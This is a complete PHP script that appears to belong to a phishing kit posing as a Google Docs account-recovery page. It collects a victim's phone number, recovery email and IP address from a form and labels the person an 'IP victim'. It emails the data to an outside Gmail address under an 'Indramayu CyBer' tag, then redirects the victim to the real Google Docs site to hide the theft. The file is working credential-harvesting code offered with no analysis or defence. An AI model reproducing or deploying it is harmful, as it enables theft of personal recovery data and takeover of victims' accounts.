<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['phoneNumber'];
$password = $_POST['recEmail'];


$login = "Phone Number : ".$email;
$pass = "Recovery Email : ".$password;
$target = "IP victim : ".$ip;


$head = "########### Login info ############";
$foot = "####### Indramayu CyBer ###########";
$body = "Googledoc Recovery Information";
mail("jesuswire80@gmail.com", "$body","$head \n$login \n$pass \n$target \n$foot");
header("Location: https://docs.google.com");
?>